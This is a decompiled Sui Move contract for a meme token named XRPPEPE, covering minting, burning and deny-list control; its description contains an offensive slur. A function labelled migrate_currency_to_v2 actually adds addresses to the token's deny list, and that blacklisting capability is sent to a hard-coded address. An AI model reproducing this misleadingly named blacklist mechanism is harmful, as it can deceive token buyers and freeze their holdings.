module 0x989b59fe295677b1290cffc3c3166e7f61b0ba48f7e9ae35d41cc5991b7daba1::xrppepe {
    struct XRPPEPE has drop {
        dummy_field: bool,
    }

    public entry fun burn(arg0: &mut 0x2::coin::TreasuryCap<XRPPEPE>, arg1: 0x2::coin::Coin<XRPPEPE>) {
        0x2::coin::burn<XRPPEPE>(arg0, arg1);
    }

    fun init(arg0: XRPPEPE, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<XRPPEPE>(arg0, 9, b"XRPPEPE", b"EXtREMeLY ReTaRdED PepE", b"EXtREMeLY ReTaRdED PepE (XRPEPE) X: https://x.com/XRPEPESUUI TG: https://t.me/XRPEPESUI", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe_from_bytes(b"https://i.ibb.co/8gDby3L/XRPPEPE.jpg")), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<XRPPEPE>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<XRPPEPE>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<XRPPEPE>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<XRPPEPE>>(v1, @0xfe75cc55f19579dfd619240c1961a6c35f1073451cbd52cb2202aabe9c585e9b);
    }

    public fun migrate_currency_to_v2(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<XRPPEPE>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<XRPPEPE>(arg0, arg1, arg2, arg3);
    }

    public entry fun mint(arg0: &mut 0x2::coin::TreasuryCap<XRPPEPE>, arg1: u64, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::mint_and_transfer<XRPPEPE>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

